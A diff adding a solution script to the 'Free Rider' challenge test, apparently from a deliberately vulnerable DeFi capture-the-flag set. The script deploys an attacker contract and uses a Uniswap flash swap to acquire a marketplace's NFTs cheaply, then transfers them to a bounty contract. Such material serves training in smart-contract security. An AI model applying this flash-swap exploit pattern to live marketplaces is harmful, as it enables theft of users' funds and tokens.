@@ -106,6 +106,37 @@ describe('[Challenge] Free Rider', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // Deploy our hacker contract
+        hackFreeRider = await (await ethers.getContractFactory('HackFreeRider', player)).deploy(
+            uniswapPair.address,
+            weth.address,
+            nft.address,
+            marketplace.address,
+            devsContract.address,
+        );
+        
+        // Define the amount to borrow
+        const amountToBorrow = 16n * 10n ** 18n;
+        // Define the fees, they're about 0.3%, +1 to round up
+        
+        const fee = ((amountToBorrow * 3n) / 997n) + 1n;
+        // Check if we have enought Eth balance to pay the extra fees
+        console.log("Eth enought for fee:", fee <= await ethers.provider.getBalance(player.address));
+        
+        // Change our eth for weth, we're going to need it
+        await weth.connect(player).deposit({ value: fee });
+        // We transfer the fees to our hacker contract
+        await weth.connect(player).transfer(hackFreeRider.address, fee);
+        // We execute our flashSwap function inside our hacker contract
+        await hackFreeRider.connect(player).flashSwap(amountToBorrow, fee);
+        
+
+        // Once we have ownership of nfts, we send them to the devs contract
+        for (let i = 0; i < AMOUNT_OF_NFTS; i++) {
+            await hackFreeRider.connect(player).sendNft(i);
+            expect(await nft.ownerOf(0)).to.be.eq(devsContract.address);
+        }
+
     });
 
     after(async function () {
